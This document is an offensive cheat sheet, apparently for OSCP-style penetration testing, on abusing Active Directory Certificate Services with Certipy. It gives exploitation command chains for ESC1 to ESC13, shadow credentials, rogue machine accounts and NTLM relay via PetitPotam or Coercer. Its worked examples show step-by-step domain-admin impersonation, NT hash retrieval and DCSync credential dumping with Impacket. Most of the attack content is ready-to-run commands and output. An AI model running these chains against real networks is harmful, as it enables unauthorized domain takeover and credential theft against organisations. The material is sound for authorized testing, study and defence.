# Certipy ADCS Cheat Sheet — Enumeration & Abuse (OSCP-style)

Certipy (`ly4k/Certipy`, PyPI package `certipy-ad`) is the primary tool for enumerating and abusing Active Directory Certificate Services (AD CS / PKI) misconfigurations ("ESC1–ESC16"). This sheet covers the core sub-commands (`find`, `req`, `auth`, `shadow`, `account`) and gives command-level exploitation paths for ESC1–ESC8.

Install: `pip install certipy-ad` (invoked as `certipy` or `certipy-ad`).

---

## 0. Global / connection flags (apply to almost every sub-command)

| Flag | Purpose |
|---|---|
| `-u`/`-username user@domain` | Auth username (UPN or `-username` + `-domain`) |
| `-p`/`-password` | Password |
| `-hashes LM:NT` | Pass-the-hash |
| `-k` | Use Kerberos auth (needs valid TGT/ccache or `-aes`) |
| `-aes key` | AES key for Kerberos |
| `-no-pass` | Don't prompt for a password (e.g. Kerberos-only) |
| `-dc-ip x.x.x.x` | IP of a Domain Controller (LDAP target) |
| `-target-ip` / `-target hostname` | Target host for the actual CA/RPC/HTTP operation |
| `-ns` | Alternate nameserver for DNS resolution |
| `-dns-tcp` | Use TCP for DNS |
| `-ldap-scheme`, `-ldap-port`, `-no-ldap-channel-binding`, `-no-ldap-signing`, `-ldap-simple-auth` | LDAP connection tuning (needed against hardened DCs / LDAPS-only) |
| `-debug` | Verbose troubleshooting output |

---

## 1. Core sub-command quick reference

### `certipy find` — enumerate CAs, templates, ACLs
```
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
```
Key flags: `-text` (default, file), `-stdout` (print to console instead of file), `-json`, `-csv`, `-output prefix`, `-enabled` (only enabled templates), `-vulnerable` (only templates flagged exploitable given the caller's group memberships), `-oids` (issuance policy OIDs, relevant to ESC13/ESC15), `-hide-admins` (suppress noisy admin ACEs), `-dc-only` (LDAP-only, skip live CA RPC/HTTP checks — useful when CA is unreachable/firewalled), `-bloodhound` / `-old-bloodhound` (BloodHound-compatible export).

### `certipy req` — request/retrieve a certificate
```
certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
```
Key flags: `-ca name`, `-template name` (default `User`), `-upn`, `-dns`, `-sid`, `-subject` (SAN/subject injection for ESC1/ESC6), `-on-behalf-of 'DOMAIN\user'` (enrollment-agent abuse for ESC3), `-pfx file` (auth with a cert you already hold, e.g. the enrollment-agent cert), `-retrieve <reqID>` (pull a previously-pending/approved cert), `-key-size`, `-archive-key`/`-cax-cert` (key-archival relay abuse), `-out file`, `-web`/`-dcom`/`-dynamic-endpoint` (RPC transport choice).

### `certipy auth` — PKINIT authentication with a cert → TGT + NT hash
```
certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128
```
Key flags: `-pfx file`, `-password` (PFX password if set), `-username`/`-domain` (override identity, useful when the cert has no UPN or you're targeting cross-domain), `-no-hash` (skip UnPAC-the-hash NT hash retrieval), `-no-save` (don't write the `.ccache`), `-print`/`-kirbi` (dump TGT in kirbi format). By default it writes a `.ccache` file you can `export KRB5CCNAME=<file>.ccache` and hand to Impacket (`-k -no-pass`) or `secretsdump.py -k`.

### `certipy shadow` — Shadow Credentials (msDS-KeyCredentialLink) attack
```
certipy shadow auto -u john@corp.local -p Passw0rd -account Jane
```
Actions: `auto` (add key cred → PKINIT auth → retrieve NT hash/TGT → restore original attribute, one-shot), `list`, `add`, `remove`, `info`. Key flags: `-account target_sam` (account to target — requires `GenericWrite`/`GenericAll`/`WriteProperty` on that account's `msDS-KeyCredentialLink`), `-device-id` (target a specific key cred for `remove`), `-out file`.

### `certipy account` — AD account manipulation
```
certipy account update -u john@corp.local -p Passw0rd -user Jane -upn administrator
certipy account create -u john@corp.local -p Passw0rd -user EVIL$ -pass 'Passw0rd!'
certipy account delete -u john@corp.local -p Passw0rd -user EVIL$
```
Actions: `create`/`read`/`update`/`delete`. Key flags: `-user SAMAccountName`, `-upn`, `-dns` (dNSHostName — computer accounts), `-sam`, `-spns`, `-pass`, `-group` (target OU/group on create). Common real-world uses: (a) create a rogue computer account (abusing `ms-DS-MachineAccountQuota`, default 10/user) as a foothold for coercion/relay chains; (b) `-dns` spoofing of a computer account's `dNSHostName` you control, to impersonate a DC/server for Kerberos relay (bypasses SPN validation on the target you're pretending to be); (c) temporarily rewriting a victim's `-upn` to `administrator` to abuse weak UPN-based certificate mapping (ESC9/ESC10-style), then restoring it afterward.

---

## 2. ESC1–ESC8 Summary Table

| ESC | Misconfiguration | Certipy `find` detection | Exploit command sequence (short form) |
|---|---|---|---|
| **ESC1** | Template lets low-priv enrollees supply an arbitrary SAN (`Enrollee Supplies Subject: True`) + allows Client Authentication EKU + low-priv `Enrollment Rights` + no manager approval/auth-signatures required | `[!] Vulnerabilities: ESC1` printed under the template; text shows `Enrollee Supplies Subject: True`, `Client Authentication: True`, `Requires Manager Approval: False` | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template VulnTemplate -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC2** | Template EKU = "Any Purpose" or no EKU defined at all (treated as usable for anything, incl. client auth or as an enrollment agent) | `[!] Vulnerabilities: ESC2`; text shows `Any Purpose: True` (or empty EKU list) | Request the cert, then either use it directly for client auth (if also ESC1-like) or use it as a stand-in enrollment-agent cert exactly like ESC3 below |
| **ESC3** | Template has the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`) enrollable by low-priv users → lets holder request certs *on behalf of* any other user | `[!] Vulnerabilities: ESC3`; text shows EKU `Certificate Request Agent`; look for a paired target template flagged `ESC3 Target Template` allowing enrollment-agent-signed requests | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template EnrollmentAgentTemplate` (get agent cert) → `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template User -on-behalf-of 'CORP\Administrator' -pfx john.pfx` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC4** | Low-priv principal has dangerous AD object rights on the **template object itself** (`WriteOwner`/`WriteDacl`/`WriteProperty`/`GenericAll`) → can reconfigure it into an ESC1-style template | `[!] Vulnerabilities: ESC4`; text shows `[+] User ACL Principals` / `Full Control Principals` for a low-priv group | `certipy template -u user@corp.local -p pass -template SecureTemplate -save-old -write-default-configuration` (backdoors it to ESC1 config) → `certipy req ... -template SecureTemplate -upn administrator@corp.local` → `certipy auth -pfx ... ` → restore: `certipy template -u user@corp.local -p pass -template SecureTemplate -configuration SecureTemplate.json` |
| **ESC5** | Low-priv write access to **other PKI AD objects** in the Configuration NC (CA computer object, `pKIEnrollmentService`, AIA/`NTAuthCertificates` containers, CDP objects) — a broad catch-all that can lead to CA compromise | Not directly flagged by `find -vulnerable`; found via ACL review on `CN=Public Key Services,CN=Services,CN=Configuration,DC=...` (BloodHound / `dacledit` / manual LDAP ACL enum) | Varies by object; end goal is usually stealing/backing up the CA's private key: `certipy ca -ca CORP-CA -backup -u admin@corp.local -p pass -target ca.corp.local` → `certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'` → `certipy auth -pfx administrator_forged.pfx -dc-ip <dcip>` |
| **ESC6** | CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set → any template accepts a caller-supplied SAN in the request attributes, bypassing per-template restrictions (largely mitigated by the May 2022 KB5014754 hardening unless combined with ESC9/ESC10/ESC16, i.e. the SID security extension is missing) | `[!] Vulnerabilities: ESC6`; text shows `User Specified SAN: Enabled` at the CA level | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500` (any enrollable template, SAN injected via request attribute) → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC7** | Low-priv principal holds `ManageCA` (CA Administrator) and/or `ManageCertificates` (Certificate Manager/Officer) rights on the **CA object** | `[!] Vulnerabilities: ESC7`; text shows `Access Rights` → `ManageCa: <principal>` / `ManageCertificates: <principal>` | `certipy ca -ca CORP-CA -u user@corp.local -p pass -target ca.corp.local -enable-template SubCA` → `certipy req -u user@corp.local -p pass -ca CORP-CA -target ca.corp.local -template SubCA -upn administrator@corp.local` (request goes pending — SubCA requires manager approval) → `certipy ca -ca CORP-CA -u user@corp.local -p pass -target ca.corp.local -issue-request <reqID>` (needs `ManageCertificates`) → `certipy req -u user@corp.local -p pass -ca CORP-CA -target ca.corp.local -retrieve <reqID>` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
| **ESC8** | CA Web Enrollment (`certsrv`/`certfnsh.asp`) is enabled over HTTP without EPA/channel binding, and NTLM is usable → coerce a privileged host (DC, server) to authenticate to attacker, relay that NTLM auth to the CA's HTTP enrollment endpoint | `[!] Vulnerabilities: ESC8` when web enrollment endpoint is enumerable; text shows `Web Enrollment: Enabled` under the CA. (Certipy itself doesn't detect the coercion angle — that's separate recon, e.g. `find` shows the vulnerable interface, coercion tools trigger the auth) | `certipy relay -target 'http://ca.corp.local/certsrv/'` (listener) → trigger auth from victim (e.g. `PetitPotam.py <attacker_ip> <victim_dc>` or `coercer coerce`) → cert dumped automatically → `certipy auth -pfx administrator_dc.pfx -dc-ip <dcip>` |

Notes:
- `-vulnerable` in `find` filters to templates the *authenticated principal* (or groups it's a nested member of) can actually enroll in and abuse — always also run a plain `find` (no `-vulnerable`) once to see the full picture, since ACL misconfigs (ESC4/ESC7) affecting `Everyone`/`Authenticated Users`/`Domain Users` will still show.
- Since KB5014754 (May 2022) and the follow-up November 2022 patch, DCs default to `Compatibility`/`Full Enforcement` certificate mapping, which weakens ESC1/ESC6/ESC8 unless the forged cert carries the `szOID_NTDS_CA_SECURITY_EXT` SID extension or you pass `-sid` — Certipy adds this automatically when `-sid` is given, and warns in `find` output if a template is only exploitable pre-patch.

---

## 2b. ESC9–ESC13 Summary Table

These target the same weak-certificate-mapping and issuance-policy gaps that KB5014754 partially closed — ESC9/ESC10 exploit the *absence* of the SID security extension rather than relaying around it, and ESC11–ESC13 cover additional RPC/HSM/issuance-policy vectors documented after the original Certified Pre-Owned taxonomy.

| ESC | Misconfiguration | Exploit command sequence (short form) |
|---|---|---|
| **ESC9** | Template has `CT_FLAG_NO_SECURITY_EXTENSION` set (no SID embedded in the cert) + weak certificate mapping on the DC. Requires `GenericWrite` on the victim account. | Temporarily flip victim's UPN to the target's UPN, request cert as victim, restore UPN, authenticate: `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template ESC9template -dc-ip <IP>` → restore original UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |
| **ESC10** | Weak certificate-mapping **registry keys** (`CertificateMappingMethods`/`StrongCertificateBindingEnforcement`) on the DC itself, rather than a template flag | Same UPN-swap technique as ESC9, but targets the DC's cert-mapping configuration rather than a specific template |
| **ESC11** | CA's ICPR RPC endpoint doesn't enforce `IF_ENCRYPT` → NTLM relay to RPC instead of HTTP (bypasses the EPA/channel-binding mitigations that closed most of ESC8 over HTTP) | `certipy relay -target 'rpc://<CA_host>' -ca CA_NAME -template DomainController` or `ntlmrelayx.py -t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name 'CA_NAME' -smb2support --template DomainController` |
| **ESC12** | CA private key stored on an accessible smart-card HSM/registry-protected store — a shell on the CA server itself equals full PKI compromise | Post-exploitation credential/key extraction via `certutil`/DPAPI once you have code execution on the CA host, then `certipy ca -backup` |
| **ESC13** | Certificate template's issuance policy OID is linked (via `msPKI-Certificate-Policy` → `msDS-OIDToGroupLink`) to a privileged AD group | `certipy find -u 'user@domain' -p 'password' -dc-ip <IP> -vulnerable -stdout` (look for the OID→group link) → `certipy req -u 'user@domain' -p 'password' -ca CA_NAME -template TEMPLATE_NAME` → `certipy auth -pfx cert.pfx` to inherit the linked group's access |

**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html · https://www.hackingarticles.in/adcs-esc9-no-security-extension/ · https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/ · https://adminions.ca/books/adcs/page/esc13

---

## 3. Worked examples

### 3.1 ESC1 — Enrollee-supplied subject, client-auth template

**Enumerate:**
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable -stdout
```
Look for output like:
```
Certificate Templates
  0
    Template Name                       : VulnUserCert
    ...
    Enrollee Supplies Subject           : True
    Client Authentication               : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Enrollment Rights                   : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : 'CORP.LOCAL\\Domain Users' can enroll and specify a subject, template allows client authentication
```

**Request a cert impersonating Domain Admin (via UPN + explicit SID for strong-mapping compliance):**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local \
  -template VulnUserCert \
  -upn administrator@corp.local \
  -sid S-1-5-21-3239415629-1108232037-1746813551-500
```
This saves `administrator.pfx`.

**Authenticate with the cert (PKINIT → TGT + NT hash):**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```
Output gives the Domain Admin's `.ccache` and NT hash directly:
```
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Use the loot:**
```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local
# or PtT lateral movement:
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

### 3.2 ESC3 — Enrollment Agent abuse

**Enumerate** — confirm the agent template and its target:
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable -stdout
```
```
Template Name                   : EnrollmentAgent
Extended Key Usages             : Certificate Request Agent
Enrollment Rights               : CORP.LOCAL\Domain Users
[!] Vulnerabilities
  ESC3                          : 'CORP.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU
[*] Remarks
  ESC3 Target Template          : 'User' allows enrollment-agent-based requests
```

**Get the enrollment-agent certificate:**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local -template EnrollmentAgent
```
Saves `lowpriv.pfx`.

**Request a User-template cert on behalf of Administrator, signed with the agent cert:**
```bash
certipy req -u lowpriv@corp.local -p 'Passw0rd!' \
  -ca 'CORP-CA' -target ca.corp.local -template User \
  -on-behalf-of 'CORP\Administrator' -pfx lowpriv.pfx
```
Saves `administrator.pfx`.

**Authenticate:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 3.3 ESC8 — NTLM relay to CA HTTP enrollment endpoint

**Confirm HTTP web enrollment is up:**
```bash
certipy find -u lowpriv@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -stdout
```
```
Certificate Authorities
  0
    CA Name                         : CORP-CA
    ...
    Web Enrollment
      HTTP                          : Enabled
    [!] Vulnerabilities
      ESC8                          : Web Enrollment is enabled over HTTP without channel binding, and NTLM relay is possible
```

**Start Certipy's relay listener targeting the CA's cert-enrollment endpoint** (choose a template you can enroll in and that grants client auth, e.g. `Machine`/`DomainController`):
```bash
sudo certipy relay -target 'http://ca.corp.local' -template DomainController
```
(Certipy's `relay` command speaks the ADCS Web Enrollment protocol itself — no separate `ntlmrelayx.py` needed unless you want the RPC/`ICertPassage` path.)

**Coerce an authentication from a target (e.g. the Domain Controller) to your relay listener**, e.g. with PetitPotam or Coercer:
```bash
python3 PetitPotam.py -u lowpriv -p 'Passw0rd!' -d corp.local <attacker_ip> <dc-hostname>
# or
coercer coerce -l <attacker_ip> -u lowpriv -p 'Passw0rd!' -d corp.local -t <dc-ip>
```

**Certipy prints the issued cert on success** (auto-saved as `<target>.pfx`, e.g. `dc01.pfx`).

**Authenticate as the machine account and get its NT hash / TGT:**
```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

**From there:** if you relayed as a DC machine account you typically pivot straight to DCSync:
```bash
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc
```

---

## 4. Bonus: Shadow Credentials worked example

Precondition: you (or a group you're in) hold `GenericWrite`/`GenericAll`/`WriteProperty` on the target's `msDS-KeyCredentialLink` attribute (common when abusing delegated AD object rights, unrelated to ADCS templates but part of the same cert-based auth primitive).

```bash
certipy shadow auto -u lowpriv@corp.local -p 'Passw0rd!' -account Jane
```
This: (1) adds a new Key Credential to `Jane`'s `msDS-KeyCredentialLink`, (2) performs PKINIT with the injected cert to retrieve Jane's TGT + NT hash, (3) restores the original attribute value to reduce forensic footprint. Output gives Jane's NT hash directly, usable for pass-the-hash/secretsdump.

Manual (staged) version:
```bash
certipy shadow add -u lowpriv@corp.local -p 'Passw0rd!' -account Jane        # add key cred, get .pfx
certipy auth -pfx Jane.pfx -dc-ip 10.10.10.10                                # PKINIT -> TGT + hash
certipy shadow remove -u lowpriv@corp.local -p 'Passw0rd!' -account Jane -device-id <id>  # cleanup
```

---

## 5. Bonus: `account` command for chained abuse

Create a rogue computer account (uses your `ms-DS-MachineAccountQuota`, default 10) as a foothold for coercion/relay attacks or ESC8 requests requiring a machine identity:
```bash
certipy account create -u lowpriv@corp.local -p 'Passw0rd!' -user 'EVILPC$' -pass 'Passw0rd123!'
```
Point its `dNSHostName` at another host you want to relay as (SPN/Kerberos relay prep) — needs write access to that computer object's own `dNSHostName`/`servicePrincipalName`, only legal on an account you control:
```bash
certipy account update -u 'EVILPC$' -p 'Passw0rd123!' -user 'EVILPC$' -dns dc01.corp.local
```
Clean up after the engagement:
```bash
certipy account delete -u lowpriv@corp.local -p 'Passw0rd!' -user 'EVILPC$'
```

---

## References
- [ly4k/Certipy GitHub repo & README](https://github.com/ly4k/Certipy)
- [Certipy Wiki – 05 Usage](https://github.com/ly4k/Certipy/wiki/05-‐-Usage), [08 Command Reference](https://github.com/ly4k/Certipy/wiki/08-‐-Command-Reference), [06 Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation)
- SpecterOps, "Certified Pre-Owned" (original ESC1–ESC8 taxonomy)
- SpecterOps, "Certificates and Pwnage and Patches, Oh My!" (KB5014754 impact on ESC6/9/10)
- Oliver Lyak (ly4k), "Certipy 4.0: ESC9 & ESC10..." research post
- [The Hacker Recipes – AD CS](https://www.thehacker.recipes/ad/movement/adcs/)
